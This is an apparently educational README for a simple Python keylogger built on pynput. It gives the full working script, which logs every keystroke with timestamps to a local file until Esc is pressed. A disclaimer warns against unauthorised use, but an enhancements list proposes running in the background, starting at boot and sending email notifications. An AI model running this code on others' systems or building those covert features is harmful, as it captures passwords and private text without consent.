# Basic Keylogger

A simple educational keylogger built in Python using the pynput library. This project demonstrates how keyloggers work and is intended for educational purposes only.

## Overview

This project creates a basic keylogger that:
- Records all keystrokes on the system
- Logs them with timestamps to a text file
- Continues running until the Escape key is pressed
- Works on Kali Linux (and other Linux distributions)

## Disclaimer

**This software is for educational purposes only.** Using keyloggers without proper authorization is:
- Potentially illegal
- Unethical
- A violation of privacy

Always ensure you have explicit permission before monitoring any system or user.

## Prerequisites

- Kali Linux (or another Linux distribution)
- Python 3
- Administrative privileges (for installation)

## Installation Steps

### 1. Install the required Python package

Since Kali Linux uses an externally managed environment, we used the apt package manager instead of pip:

```bash
sudo apt install python3-pynput
```

### 2. Create a project directory

```bash
mkdir ~/keylogger_project
cd ~/keylogger_project
```

### 3. Create the keylogger script

Create a file named `keylogger.py` with the following code:

```python
from pynput.keyboard import Key, Listener
import logging
import time
import os

# Set up the logging configuration
log_dir = os.path.join(os.path.expanduser('~'), "keylogger_project")
if not os.path.exists(log_dir):
    os.makedirs(log_dir)

# Create log file with timestamp
log_file = os.path.join(log_dir, f"keylog_{time.strftime('%Y%m%d-%H%M%S')}.txt")

# Configure the logging
logging.basicConfig(
    filename=log_file,
    level=logging.INFO,
    format='%(asctime)s: %(message)s'
)

print(f"Keylogger started. Logging to {log_file}")
print("Press Esc key to stop the keylogger")

def on_press(key):
    try:
        # Log alphanumeric keys
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        # Log special keys
        logging.info(f"Special key pressed: {key}")

def on_release(key):
    logging.info(f"Key released: {key}")
    
    # Stop the keylogger if Esc is pressed
    if key == Key.esc:
        print("Keylogger stopped")
        return False

# Start the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
```

## Usage

### Run the keylogger

```bash
python3 keylogger.py
```
![Alt text](images/example.png)
### Stop the keylogger

Press the **Esc** key to stop the keylogger properly. 

> Note: Using Ctrl+C will cause a KeyboardInterrupt and the program will not exit cleanly.

### View logged keystrokes

```bash
cat ~/keylogger_project/keylog_*.txt
```

This will display all captured keystrokes with their timestamps.
![Alt text](images/example.png)
## How It Works

1. **Listener Setup**: The script uses pynput's Listener to monitor keyboard events.
2. **Event Handlers**: 
   - `on_press()`: Logs when a key is pressed
   - `on_release()`: Logs when a key is released and checks for the Esc key to stop the program
3. **Logging**: All events are saved to a timestamped log file with detailed information

## Potential Enhancements

For legitimate use cases, this basic keylogger could be enhanced with:

- Background operation (running as a service)
- Startup automation
- Email notifications
- Log file encryption
- Advanced filtering options
- GUI for configuration

## Troubleshooting

### Common Issues:

1. **Permission Errors**: Ensure you have the necessary permissions to write to the log directory.
2. **Module Not Found**: If you get a "No module named 'pynput'" error, make sure you installed the package correctly.
3. **X Server Access**: For GUI applications, ensure the script has access to the X server.

## Resources

- [pynput Documentation](https://pynput.readthedocs.io/)
- [Python Logging Documentation](https://docs.python.org/3/library/logging.html)

